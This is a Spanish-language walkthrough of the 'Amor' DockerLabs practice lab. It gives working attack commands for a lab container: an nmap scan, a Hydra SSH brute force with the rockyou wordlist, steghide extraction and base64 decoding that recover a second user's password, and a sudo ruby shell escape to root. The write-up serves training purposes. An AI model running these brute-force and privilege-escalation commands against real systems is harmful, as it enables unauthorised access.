---
title: "DockerLabs - Amor"
difficulty: "Fácil"
source: "DockerLabs"
---

Laboratorio para practicar enumeración web, fuerza bruta SSH con Hydra y escalada de privilegios en Linux.

## Despliegue

```bash
bash auto_deploy.sh amor.tar
```

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

Puertos detectados:
- **22/tcp** — SSH (OpenSSH)
- **80/tcp** — HTTP (Apache)

## Enumeración Web

En la página web se identifica un usuario: **`carlota`**.

## Intrusión — carlota

Fuerza bruta SSH con Hydra:

```bash
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```

Credenciales: `carlota:babygirl`

```bash
ssh carlota@172.17.0.2
```

## Movimiento Lateral — oscar

En el home de carlota:

```
/home/carlota/Desktop/fotos/vacaiones/imagen.jpg
```

Se extrae contenido oculto con steghide (passphrase vacía):

```bash
scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaiones/imagen.jpg ~
steghide extract -sf imagen.jpg -p ""
```

Genera `secret.txt` con contenido Base64:

```bash
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d
# lacasadepinypon
```

```bash
su oscar
# contraseña: lacasadepinypon
```

## Escalada de Privilegios

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/ruby
```

```bash
sudo ruby -e "exec '/bin/bash'"
whoami
# root
```

## Conclusión

Cadena de ataque: usuario en web → hydra SSH → steganografía en imagen → base64 → contraseña de `oscar` → ruby sudo → root.
